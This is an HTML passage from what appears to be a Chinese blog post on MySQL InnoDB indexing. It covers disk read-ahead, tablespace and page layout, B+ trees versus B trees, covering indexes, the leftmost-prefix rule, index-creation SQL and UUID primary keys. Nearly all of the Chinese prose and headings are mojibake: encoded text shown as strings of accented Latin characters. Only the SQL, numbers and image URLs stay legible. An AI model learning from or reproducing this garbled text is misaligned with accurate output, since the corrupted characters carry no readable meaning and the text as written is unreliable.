<p>ç¼ºç‚¹ï¼šä¼šäº§ç”Ÿå¤§é‡éšæœºioï¼Œä¸»é”®ä¸æ˜¯æœ‰åºé€’å¢çš„è¯ï¼Œå¯¼è‡´æ¯æ¬¡æ’å…¥æ•°æ®äº§ç”Ÿå¤§é‡çš„æ•°æ®è¿ç§»å’Œç©ºé—´ç¢ç‰‡ã€‚ å³ä½¿ä¸»é”®æ˜¯æœ‰åºé€’å¢ï¼Œå¤§é‡å†™è¯·æ±‚çš„åˆ†å¸ƒä»ç„¶æ˜¯éšæœºçš„ã€‚</p>
<h3 id="å±€éƒ¨æ€§åŸç†ä¸ç£ç›˜é¢„è¯»"><a href="#å±€éƒ¨æ€§åŸç†ä¸ç£ç›˜é¢„è¯»" class="headerlink" title="å±€éƒ¨æ€§åŸç†ä¸ç£ç›˜é¢„è¯»"></a>å±€éƒ¨æ€§åŸç†ä¸ç£ç›˜é¢„è¯»</h3><p>ç”±äºå­˜å‚¨ä»‹è´¨çš„ç‰¹æ€§ï¼Œç£ç›˜æœ¬èº«å­˜å–å°±æ¯”ä¸»å­˜æ…¢å¾ˆå¤šï¼Œå†åŠ ä¸Šæœºæ¢°è¿åŠ¨è€—è´¹ï¼Œç£ç›˜çš„å­˜å–é€Ÿåº¦å¾€å¾€æ˜¯ä¸»å­˜çš„å‡ ç™¾åˆ†åˆ†ä¹‹ä¸€ï¼Œå› æ­¤ä¸ºäº†æé«˜æ•ˆç‡ï¼Œè¦å°½é‡å‡å°‘ç£ç›˜I&#x2F;Oã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œç£ç›˜å¾€å¾€ä¸æ˜¯ä¸¥æ ¼æŒ‰éœ€è¯»å–ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½ä¼šé¢„è¯»ï¼Œå³ä½¿åªéœ€è¦ä¸€ä¸ªå­—èŠ‚ï¼Œç£ç›˜ä¹Ÿä¼šä»è¿™ä¸ªä½ç½®å¼€å§‹ï¼Œé¡ºåºå‘åè¯»å–ä¸€å®šé•¿åº¦çš„æ•°æ®æ”¾å…¥å†…å­˜ã€‚è¿™æ ·åšçš„ç†è®ºä¾æ®æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­è‘—åçš„<strong>å±€éƒ¨æ€§åŸç†</strong>ï¼š<strong>å½“ä¸€ä¸ªæ•°æ®è¢«ç”¨åˆ°æ—¶ï¼Œå…¶é™„è¿‘çš„æ•°æ®ä¹Ÿé€šå¸¸ä¼šé©¬ä¸Šè¢«ä½¿ç”¨ã€‚ç¨‹åºè¿è¡ŒæœŸé—´æ‰€éœ€è¦çš„æ•°æ®é€šå¸¸æ¯”è¾ƒé›†ä¸­ã€‚</strong></p>
<p>ç”±äºç£ç›˜é¡ºåºè¯»å–çš„æ•ˆç‡å¾ˆé«˜ï¼ˆä¸éœ€è¦å¯»é“æ—¶é—´ï¼Œåªéœ€å¾ˆå°‘çš„æ—‹è½¬æ—¶é—´ï¼‰ï¼Œå› æ­¤å¯¹äºå…·æœ‰å±€éƒ¨æ€§çš„ç¨‹åºæ¥è¯´ï¼Œé¢„è¯»å¯ä»¥æé«˜I&#x2F;Oæ•ˆç‡ã€‚</p>
<p>é¢„è¯»çš„é•¿åº¦ä¸€èˆ¬ä¸ºé¡µï¼ˆpageï¼‰çš„æ•´å€æ•°ã€‚é¡µæ˜¯è®¡ç®—æœºç®¡ç†å­˜å‚¨å™¨çš„é€»è¾‘å—ï¼Œç¡¬ä»¶åŠæ“ä½œç³»ç»Ÿå¾€å¾€å°†ä¸»å­˜å’Œç£ç›˜å­˜å‚¨åŒºåˆ†å‰²ä¸ºè¿ç»­çš„å¤§å°ç›¸ç­‰çš„å—ï¼Œæ¯ä¸ªå­˜å‚¨å—ç§°ä¸ºä¸€é¡µï¼ˆåœ¨è®¸å¤šæ“ä½œç³»ç»Ÿä¸­ï¼Œé¡µå¾—å¤§å°é€šå¸¸ä¸º4kï¼‰ï¼Œä¸»å­˜å’Œç£ç›˜ä»¥é¡µä¸ºå•ä½äº¤æ¢æ•°æ®ã€‚å½“ç¨‹åºè¦è¯»å–çš„æ•°æ®ä¸åœ¨ä¸»å­˜ä¸­æ—¶ï¼Œä¼šè§¦å‘ä¸€ä¸ªç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šå‘ç£ç›˜å‘å‡ºè¯»ç›˜ä¿¡å·ï¼Œç£ç›˜ä¼šæ‰¾åˆ°æ•°æ®çš„èµ·å§‹ä½ç½®å¹¶å‘åè¿ç»­è¯»å–ä¸€é¡µæˆ–å‡ é¡µè½½å…¥å†…å­˜ä¸­ï¼Œç„¶åå¼‚å¸¸è¿”å›ï¼Œç¨‹åºç»§ç»­è¿è¡Œã€‚</p>
<h3 id="æ•°æ®åº“åœ¨ç£ç›˜ä¸­å¦‚ä½•å­˜å‚¨ï¼Ÿ"><a href="#æ•°æ®åº“åœ¨ç£ç›˜ä¸­å¦‚ä½•å­˜å‚¨ï¼Ÿ" class="headerlink" title="æ•°æ®åº“åœ¨ç£ç›˜ä¸­å¦‚ä½•å­˜å‚¨ï¼Ÿ"></a>æ•°æ®åº“åœ¨ç£ç›˜ä¸­å¦‚ä½•å­˜å‚¨ï¼Ÿ</h3><p>ä»¥Innodbå¼•æ“ä¸ºå‡†ï¼Œç®€å•çš„è¯´ï¼ŒæŒ‰ç…§è¡¨ç©ºé—´ã€æ®µã€ç°‡ã€é¡µè¿›è¡Œå­˜å‚¨ã€‚</p>
<p>å½“æ–°å»ºä¸€ä¸ªè¡¨ï¼Œå°±ä¼šåœ¨ç£ç›˜ä¸Šæ–°å»ºä¸€ä¸ªè¡¨ç©ºé—´ï¼ˆé€»è¾‘æ¦‚å¿µï¼‰ï¼Œç”¨äºå­˜å‚¨æ•°æ®ã€‚</p>
<p>ä¸€ä¸ªè¡¨ç©ºé—´ä¸­åŒ…å«å¤šä¸ªæ®µï¼ŒåŒ…æ‹¬å¶å­èŠ‚ç‚¹æ®µï¼ˆæ•°æ®æ®µï¼‰ï¼Œéå¶å­èŠ‚ç‚¹æ®µï¼ˆç´¢å¼•æ®µï¼‰ï¼Œå›æ»šæ®µï¼ˆä¿è¯æ•°æ®å®Œæ•´æ€§ï¼‰ã€‚åœ¨Innodbå¼•æ“ä¸­ï¼Œæ•°æ®ä»¥ç´¢å¼•ç»„ç»‡ï¼Œå³èšç°‡ç´¢å¼•ï¼Œæ–°å»ºä¸€ä¸ªç´¢å¼•ï¼Œåœ¨è¡¨ç©ºé—´ä¸­ä¼šåŒæ—¶å»ºç«‹æ•°æ®æ®µå’Œç´¢å¼•æ®µã€‚</p>
<p>ä¸€ä¸ªæ®µåˆåŒ…æ‹¬å¤šä¸ªç°‡ã€‚ç°‡æ˜¯æ„æˆæ®µçš„åŸºæœ¬å…ƒç´ ï¼Œä¸€ä¸ªæ®µç”±è‹¥å¹²ä¸ªç°‡æ„æˆã€‚ä¸€ä¸ªç°‡æ˜¯ç‰©ç†ä¸Šè¿ç»­åˆ†é…çš„ä¸€ä¸ªæ®µç©ºé—´ï¼Œæ¯ä¸€ä¸ªæ®µè‡³å°‘ä¼šæœ‰ä¸€ä¸ªç°‡ï¼Œåœ¨åˆ›å»ºä¸€ä¸ªæ®µæ—¶ä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤çš„ç°‡ã€‚å¦‚æœå­˜å‚¨æ•°æ®æ—¶ï¼Œä¸€ä¸ªç°‡å·²ç»ä¸è¶³ä»¥æ”¾ä¸‹æ›´å¤šçš„æ•°æ®ï¼Œæ­¤æ—¶éœ€è¦ä»è¿™ä¸ªæ®µä¸­åˆ†é…ä¸€ä¸ªæ–°çš„ç°‡æ¥å­˜æ”¾æ–°çš„æ•°æ®ã€‚ä¸€ä¸ªæ®µæ‰€ç®¡ç†çš„ç©ºé—´å¤§å°æ˜¯æ— é™çš„ï¼Œå¯ä»¥ä¸€ç›´æ‰©å±•ä¸‹å»ï¼Œä½†æ˜¯æ‰©å±•çš„æœ€å°å•ä½å°±æ˜¯ç°‡ã€‚</p>
<p>ä¸€ä¸ªç°‡ç”±64ä¸ªè¿ç»­çš„é¡µç»„æˆã€‚æ¯ä¸ªé¡µå¤§å°ä¸º16KBï¼Œå³æ¯ä¸ªç°‡çš„å¤§å°ä¸º1MBã€‚é¡µå¯ä»¥ç†è§£ä¸ºç°‡çš„ç»†åŒ–ï¼Œåœ¨é€»è¾‘ï¼ˆé¡µé¢å·è¿ç»­é€’å¢ï¼‰å’Œç‰©ç†ä¸Šé¡µçš„å­˜å‚¨éƒ½æ˜¯è¿ç»­çš„ï¼Œåœ¨å‘è¡¨ä¸­æ’å…¥æ•°æ®æ—¶ï¼Œå¦‚æœä¸€ä¸ªé¡µé¢å·²ç»è¢«å†™å®Œï¼Œç³»ç»Ÿä¼šä»å½“å‰ç°‡ä¸­åˆ†é…ä¸€ä¸ªæ–°çš„ç©ºé—²é¡µé¢å¤„ç†ä½¿ç”¨ï¼Œå¦‚æœå½“å‰ç°‡ä¸­çš„64ä¸ªé¡µé¢éƒ½è¢«åˆ†é…å®Œï¼Œç³»ç»Ÿä¼šä»å½“å‰é¡µé¢æ‰€åœ¨æ®µä¸­åˆ†é…ä¸€ä¸ªæ–°çš„ç°‡ï¼Œç„¶åå†ä»è¿™ä¸ªç°‡ä¸­åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢æ¥ä½¿ç”¨ã€‚</p>
<h3 id="Mysqlä¸ºä»€ä¹ˆä½¿ç”¨b-æ ‘ï¼Œè€Œä¸æ˜¯bæ ‘ã€äºŒå‰æ ‘ã€AVLæ ‘æˆ–çº¢é»‘æ ‘ï¼Ÿ"><a href="#Mysqlä¸ºä»€ä¹ˆä½¿ç”¨b-æ ‘ï¼Œè€Œä¸æ˜¯bæ ‘ã€äºŒå‰æ ‘ã€AVLæ ‘æˆ–çº¢é»‘æ ‘ï¼Ÿ" class="headerlink" title="Mysqlä¸ºä»€ä¹ˆä½¿ç”¨b+æ ‘ï¼Œè€Œä¸æ˜¯bæ ‘ã€äºŒå‰æ ‘ã€AVLæ ‘æˆ–çº¢é»‘æ ‘ï¼Ÿ"></a>Mysqlä¸ºä»€ä¹ˆä½¿ç”¨b+æ ‘ï¼Œè€Œä¸æ˜¯bæ ‘ã€äºŒå‰æ ‘ã€AVLæ ‘æˆ–çº¢é»‘æ ‘ï¼Ÿ</h3><ul>
<li>B+æ ‘çš„é«˜åº¦ä¸€èˆ¬åªæœ‰2-4å±‚ï¼Œæ‰€ä»¥æŸ¥æ‰¾è®°å½•æ—¶æœ€å¤šåªéœ€è¦2-4æ¬¡IOï¼Œç›¸å¯¹äºŒå‰å¹³è¡¡æ ‘å·²ç»å¤§å¤§é™ä½äº†ã€‚å¹³è¡¡äºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹åªæœ‰ä¸¤ä¸ªå­©å­èŠ‚ç‚¹ï¼Œå¦‚æœä¸€å¼ è¡¨çš„æ•°æ®é‡ç‰¹åˆ«å¤§ï¼Œæ•´æ£µæ ‘çš„é«˜åº¦ä¹Ÿä¼šéšä¹‹ä¸Šå‡ã€‚ä¸€ä¸ªåƒä¸‡çº§åˆ«çš„è¡¨å¦‚æœç”¨å¹³è¡¡äºŒå‰æ ‘ä½œä¸ºç´¢å¼•çš„è¯ï¼Œæ ‘é«˜å°†ä¼šè¾¾åˆ°äºŒåå¤šå±‚ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€åšä¸€æ¬¡æŸ¥è¯¢éœ€è¦äºŒåå¤šæ¬¡ç£ç›˜ioï¼Œè¿™æ˜¯ä¸€ä¸ªä¸å°çš„å¼€é”€ã€‚å¹³è¡¡äºŒå‰æ ‘çš„ç“¶é¢ˆåœ¨äºä¸€ä¸ªèŠ‚ç‚¹åªæœ‰ä¸¤ä¸ªå­©å­èŠ‚ç‚¹ï¼Œè€ŒBæ ‘ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥å­˜æ”¾Nä¸ªå­©å­èŠ‚ç‚¹ï¼Œè¿™å°±å®Œç¾è§£å†³äº†æ ‘é«˜çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠBæ ‘ç§°ä¸ºå¹³è¡¡å¤šå‰æ ‘ã€‚</li>
<li>èŒƒå›´æŸ¥æ‰¾æ—¶ï¼Œèƒ½é€šè¿‡å¶å­èŠ‚ç‚¹çš„æŒ‡é’ˆè·å–æ•°æ®ã€‚ä¾‹å¦‚æŸ¥æ‰¾å¤§äºç­‰äº3çš„æ•°æ®ï¼Œå½“åœ¨å¶å­èŠ‚ç‚¹ä¸­æŸ¥åˆ°3æ—¶ï¼Œé€šè¿‡3çš„å°¾æŒ‡é’ˆä¾¿èƒ½è·å–æ‰€æœ‰æ•°æ®ï¼Œè€Œä¸éœ€è¦å†åƒäºŒå‰æ ‘ä¸€æ ·å†è·å–åˆ°3çš„çˆ¶èŠ‚ç‚¹ã€‚</li>
</ul>
<h4 id="Bæ ‘å’ŒB-æ ‘"><a href="#Bæ ‘å’ŒB-æ ‘" class="headerlink" title="Bæ ‘å’ŒB+æ ‘"></a>Bæ ‘å’ŒB+æ ‘</h4><p>å¹³è¡¡äºŒå‰æ ‘çš„ç“¶é¢ˆåœ¨äºä¸€ä¸ªèŠ‚ç‚¹åªæœ‰ä¸¤ä¸ªå­©å­èŠ‚ç‚¹ï¼Œè€ŒBæ ‘ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥å­˜æ”¾Nä¸ªå­©å­èŠ‚ç‚¹ï¼Œè¿™å°±å®Œç¾è§£å†³äº†æ ‘é«˜çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠBæ ‘ç§°ä¸ºå¹³è¡¡å¤šå‰æ ‘ï¼ŒBæ ‘ä½œä¸ºç´¢å¼•å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438194.png" alt="å›¾ç‰‡æ¥æºç½‘ç»œ"></p>
<p>ä½†æ˜¯ä»¥Bæ ‘çš„ç»“æ„ä½œä¸ºç´¢å¼•ä»æœ‰å¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438215.png" alt="å›¾ç‰‡æ¥æºç½‘ç»œ"></p>
<p>ä»å›¾ç‰‡ä¸­å¯ä»¥çœ‹åˆ°B+æ ‘åŒæ ·æ˜¯ä¸€æ£µå¤šå·®å¹³è¡¡æ ‘ï¼Œå’ŒBæ ‘ä¸€æ ·å¾ˆå¥½åœ°è§£å†³äº†æ ‘é«˜çš„é—®é¢˜ã€‚</p>
<h5 id="æ”¹è¿›ç‚¹ä¸€ï¼š"><a href="#æ”¹è¿›ç‚¹ä¸€ï¼š" class="headerlink" title="æ”¹è¿›ç‚¹ä¸€ï¼š"></a>æ”¹è¿›ç‚¹ä¸€ï¼š</h5><p>Bæ ‘çš„èŠ‚ç‚¹ä¸­æ—¢å­˜å‚¨ç´¢å¼•ï¼Œä¹Ÿå­˜å‚¨è¡¨å¯¹åº”çš„æ•°æ®ï¼›è€ŒB+æ ‘çš„éå¶å­èŠ‚ç‚¹æ˜¯ä¸å­˜å‚¨æ•°æ®çš„ï¼Œåªå­˜å‚¨ç´¢å¼•ï¼Œæ•°æ®å…¨éƒ¨å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ä¸Šã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>å‡è®¾æ ‘é«˜ä¸º2ï¼Œä¸»é”®IDä¸ºbigintç±»å‹ï¼Œé•¿åº¦ä¸º8å­—èŠ‚ï¼ŒèŠ‚ç‚¹æŒ‡é’ˆä¸º6å­—èŠ‚ï¼Œä¸€è¡Œæ•°æ®è®°å½•çš„å¤§å°ä¸º1kï¼Œä¸€æ¬¡ioæ“ä½œèƒ½è·å¾—ä¸€é¡µ16kçš„æ•°æ®ã€‚</p>
<p>åœ¨ç´¢å¼•ä¸ºB+æ ‘çš„æƒ…å†µä¸‹ï¼Œæ ¹èŠ‚ç‚¹èƒ½å­˜å‚¨ï¼š16k &#x2F; ï¼ˆ6 + 8ï¼‰ &#x3D; 1170 æ¡ç´¢å¼•æŒ‡é’ˆï¼›åˆ°äº†ç¬¬ä¸€å±‚ï¼Œä¸€å…±èƒ½æŒ‡å‘ 1170 * 1170 &#x3D; 1368900 æ¡ç´¢å¼•æŒ‡é’ˆï¼›åˆ°äº†æœ€åº•ä¸€å±‚å¶å­èŠ‚ç‚¹ï¼Œä¸€ä¸ªèŠ‚ç‚¹èƒ½å­˜å‚¨16k &#x2F; 1k &#x3D; 16 æ¡è®°å½•ï¼Œä¸€å…±èƒ½å­˜å‚¨ 1170 * 1170 * 16 &#x3D; 21902400 æ¡è®°å½•</p>
<p>åœ¨Bæ ‘çš„æƒ…å†µä¸‹ï¼Œç”±äºéå¶å­èŠ‚ç‚¹ä½¿ç”¨äº†å¤§é‡ç©ºé—´å­˜å‚¨æ•°æ®ï¼Œå­˜æ”¾çš„ç´¢å¼•æŒ‡é’ˆè‚¯å®šå°±å°‘ï¼Œæœ€ç»ˆæ•´æ£µæ ‘å¦‚æœæƒ³è¦å­˜å‚¨å’ŒB+æ ‘ä¸€æ ·å¤šçš„æ•°æ®å°±å¿…é¡»è¦å¢åŠ æ ‘é«˜ï¼Œè¿™æ ·ä¸€æ¥å°±å¢åŠ äº†ç£ç›˜ioï¼Œæ‰€ä»¥è¯´B+æ ‘ä½œä¸ºç´¢å¼•çš„æ€§èƒ½æ¯”Bæ ‘é«˜ã€‚</p>
<h5 id="æ”¹è¿›ç‚¹äºŒï¼š"><a href="#æ”¹è¿›ç‚¹äºŒï¼š" class="headerlink" title="æ”¹è¿›ç‚¹äºŒï¼š"></a>æ”¹è¿›ç‚¹äºŒï¼š</h5><p>ä½¿ç”¨bæ ‘ï¼Œæ•°æ®å­˜å‚¨åœ¨æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸­ï¼Œæœç´¢æ—¶ä¼šåšå±€éƒ¨ä¸­åºéå†ï¼Œå¦‚æœæŸ¥è¯¢å¤šæ¡æ•°æ®ï¼Œå³éœ€è¦è·¨å±‚è®¿é—®ï¼Œä»ç„¶å¯¹æœç´¢æ•ˆç‡æœ‰ä¸åˆ©å½±å“ï¼›B+å¶å­èŠ‚ç‚¹ä¹‹é—´ä½¿ç”¨æŒ‡é’ˆè¿æ¥ï¼Œæé«˜åŒºé—´è®¿é—®æ•ˆç‡ã€‚å¦‚æœè¦è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œå¯ä»¥è½»æ¾é€šè¿‡B+æ ‘å¶å­èŠ‚ç‚¹ä¹‹é—´çš„æŒ‡é’ˆè¿›è¡Œéå†ï¼Œå‡å°‘äº†ä¸å¿…è¦çš„ç£ç›˜ioã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆä¸å¸¸ç”¨å“ˆå¸Œè¡¨å’Œæ•°ç»„ä½œä¸ºç´¢å¼•"><a href="#ä¸ºä»€ä¹ˆä¸å¸¸ç”¨å“ˆå¸Œè¡¨å’Œæ•°ç»„ä½œä¸ºç´¢å¼•" class="headerlink" title="ä¸ºä»€ä¹ˆä¸å¸¸ç”¨å“ˆå¸Œè¡¨å’Œæ•°ç»„ä½œä¸ºç´¢å¼•?"></a>ä¸ºä»€ä¹ˆä¸å¸¸ç”¨å“ˆå¸Œè¡¨å’Œæ•°ç»„ä½œä¸ºç´¢å¼•?</h3><p>å“ˆå¸Œè¡¨è™½ç„¶å•ä¸€ä¸ªå€¼çš„æŸ¥è¯¢æ•ˆç‡å¾ˆé«˜ï¼Œä½†æ˜¯æ’‘ä¸ä½èŒƒå›´æŸ¥è¯¢ã€‚</p>
<p>è€Œæ•°ç»„è™½ç„¶æŸ¥è¯¢çš„æ•ˆç‡é«˜ï¼Œä½†æ˜¯å¢åŠ å’Œåˆ é™¤çš„æ•ˆç‡ä½ï¼Œç”±äºè®°å½•åœ¨å¢åŠ å’Œåˆ é™¤çš„æ—¶å€™ç´¢å¼•ä¹Ÿå¾—è·Ÿç€ç»´æŠ¤ï¼Œè¿™ä¼šå¯¼è‡´å¤§æ•°æ®é‡çš„æƒ…å†µä¸‹ï¼Œå¢åŠ æˆ–åˆ é™¤ä¸€æ¡è®°å½•æ•ˆç‡è¾ƒä½ã€‚å¦‚æœæ²¡æœ‰å¢åˆ ï¼Œä¸”æŒ‰idæŸ¥è¯¢ï¼Œidé€’å¢ï¼Œåªæœ‰èŒƒå›´æŸ¥è¯¢å’Œå•æ¡æŸ¥è¯¢ï¼Œå¯ä»¥ç”¨æ•°ç»„åšç´¢å¼•ã€‚</p>
<h3 id="è¦†ç›–ç´¢å¼•"><a href="#è¦†ç›–ç´¢å¼•" class="headerlink" title="è¦†ç›–ç´¢å¼•"></a>è¦†ç›–ç´¢å¼•</h3><p>ä¸€ä¸ªç´¢å¼•åŒ…å«æ‰€æœ‰éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ï¼Œä¸éœ€è¦å›è¡¨ã€‚</p>
<p>ä¾‹å¦‚ï¼š select id,name where name&#x3D;â€™shenjianâ€™ æ­¤æ—¶ç´¢å¼•åŒ…å«äº†æ‰€éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ï¼Œ ä¸éœ€è¦å›è¡¨ã€‚</p>
<h3 id="æœ€å·¦å‰ç¼€åŸåˆ™"><a href="#æœ€å·¦å‰ç¼€åŸåˆ™" class="headerlink" title="æœ€å·¦å‰ç¼€åŸåˆ™"></a>æœ€å·¦å‰ç¼€åŸåˆ™</h3><p>åŠ è”åˆç´¢å¼•(name, city)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx <span class="keyword">and</span> city<span class="operator">=</span>xx ; ï¼ï¼å¯ä»¥å‘½ä¸­ç´¢å¼•</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> å¯ä»¥å‘½ä¸­ç´¢å¼•</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> city<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> æ— æ³•å‘½ä¸­ç´¢å¼•            </span><br></pre></td></tr></table></figure>

<h3 id="æ³¨æ„é¿å…ç´¢å¼•å†—ä½™"><a href="#æ³¨æ„é¿å…ç´¢å¼•å†—ä½™" class="headerlink" title="æ³¨æ„é¿å…ç´¢å¼•å†—ä½™"></a>æ³¨æ„é¿å…ç´¢å¼•å†—ä½™</h3><p>(name,city)å’Œ(name)å†—ä½™</p>
<h3 id="æ·»åŠ ç´¢å¼•"><a href="#æ·»åŠ ç´¢å¼•" class="headerlink" title="æ·»åŠ ç´¢å¼•"></a>æ·»åŠ ç´¢å¼•</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>ä¸»é”®ç´¢å¼•</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span> å”¯ä¸€ç´¢å¼•</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>æ™®é€šç´¢å¼•</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> FULLTEXT ( `<span class="keyword">column</span>`)  <span class="operator">/</span><span class="operator">/</span> å…¨æ–‡ç´¢å¼•</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `column1`, `column2`, `column3` ) <span class="operator">/</span><span class="operator">/</span>å¤šè¡Œç´¢å¼•</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†åº“åˆ†è¡¨åï¼Œidä¸»é”®å¦‚ä½•å¤„ç†ï¼Ÿ"><a href="#åˆ†åº“åˆ†è¡¨åï¼Œidä¸»é”®å¦‚ä½•å¤„ç†ï¼Ÿ" class="headerlink" title="åˆ†åº“åˆ†è¡¨åï¼Œidä¸»é”®å¦‚ä½•å¤„ç†ï¼Ÿ"></a>åˆ†åº“åˆ†è¡¨åï¼Œidä¸»é”®å¦‚ä½•å¤„ç†ï¼Ÿ</h2><p>å› ä¸ºè¦æ˜¯åˆ†æˆå¤šä¸ªè¡¨ä¹‹åï¼Œéœ€è¦ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ id ã€‚</p>
<p>ä¸ºäº†è¾¾åˆ°ä¸šåŠ¡çš„å¹‚ç­‰ï¼Œå¿…é¡»è¦æœ‰è¿™æ ·ä¸€ä¸ªidå­˜åœ¨ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>åŒä¸€ä¸šåŠ¡åœºæ™¯è¦å…¨å±€å”¯ä¸€ã€‚</li>
<li>è¯¥idå¿…é¡»æ˜¯åœ¨æ¶ˆæ¯çš„å‘é€æ–¹è¿›è¡Œäº§ç”Ÿå‘é€åˆ°MQã€‚</li>
<li>æ¶ˆè´¹ç«¯æ ¹æ®è¯¥idè¿›è¡Œåˆ¤æ–­æ˜¯å¦é‡å¤ï¼Œç¡®ä¿å¹‚ç­‰ã€‚</li>
</ul>
<h3 id="é€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼ˆUniversally-Unique-Identifierï¼ŒUUIDï¼‰"><a href="#é€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼ˆUniversally-Unique-Identifierï¼ŒUUIDï¼‰" class="headerlink" title="é€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼ˆUniversally Unique Identifierï¼ŒUUIDï¼‰"></a>é€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼ˆUniversally Unique Identifierï¼ŒUUIDï¼‰</h3><p>ä¸é€‚åˆä½œä¸ºä¸»é”®ï¼Œå› ä¸ºå¤ªé•¿äº†ï¼Œå¹¶ä¸”æ— åºä¸å¯è¯»ï¼ŒæŸ¥è¯¢æ•ˆç‡ä½ã€‚æ¯”è¾ƒé€‚åˆç”¨äºç”Ÿæˆå”¯ä¸€çš„åå­—çš„æ ‡ç¤ºæ¯”å¦‚æ–‡ä»¶çš„åå­—ã€‚</p>
<h4 id="ä¸ºä»€ä¹ˆæ— åºçš„UUIDä¼šå¯¼è‡´å…¥åº“æ€§èƒ½å˜å·®å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ— åºçš„UUIDä¼šå¯¼è‡´å…¥åº“æ€§èƒ½å˜å·®å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ— åºçš„UUIDä¼šå¯¼è‡´å…¥åº“æ€§èƒ½å˜å·®å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ— åºçš„UUIDä¼šå¯¼è‡´å…¥åº“æ€§èƒ½å˜å·®å‘¢ï¼Ÿ</h4><p>å…³ç³»å‹æ•°æ®åº“çš„ç´¢å¼•å¤§éƒ½æ˜¯B+æ ‘çš„ç»“æ„ï¼Œæ‹¿IDå­—æ®µæ¥ä¸¾ä¾‹ï¼Œç´¢å¼•æ ‘çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½å­˜å‚¨ç€è‹¥å¹²ä¸ªIDã€‚å¦‚æœæˆ‘ä»¬çš„IDæŒ‰é€’å¢çš„é¡ºåºæ¥æ’å…¥ï¼Œæ¯”å¦‚é™†ç»­æ’å…¥8ï¼Œ9ï¼Œ10ï¼Œæ–°çš„IDéƒ½åªä¼šæ’å…¥åˆ°æœ€åä¸€ä¸ªèŠ‚ç‚¹å½“ä¸­ã€‚å½“æœ€åä¸€ä¸ªèŠ‚ç‚¹æ»¡äº†ï¼Œä¼šè£‚å˜å‡ºæ–°çš„èŠ‚ç‚¹ã€‚è¿™æ ·çš„æ’å…¥æ˜¯æ€§èƒ½æ¯”è¾ƒé«˜çš„æ’å…¥ï¼Œå› ä¸ºè¿™æ ·èŠ‚ç‚¹çš„åˆ†è£‚æ¬¡æ•°æœ€å°‘ï¼Œè€Œä¸”å……åˆ†åˆ©ç”¨äº†æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„ç©ºé—´ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬çš„æ’å…¥å®Œå…¨æ— åºï¼Œä¸ä½†ä¼šå¯¼è‡´ä¸€äº›ä¸­é—´èŠ‚ç‚¹äº§ç”Ÿåˆ†è£‚ï¼Œä¹Ÿä¼šç™½ç™½åˆ›é€ å‡ºå¾ˆå¤šä¸é¥±å’Œçš„èŠ‚ç‚¹ï¼Œè¿™æ ·å¤§å¤§é™ä½äº†æ•°æ®åº“æ’å…¥çš„æ€§èƒ½ã€‚</p>
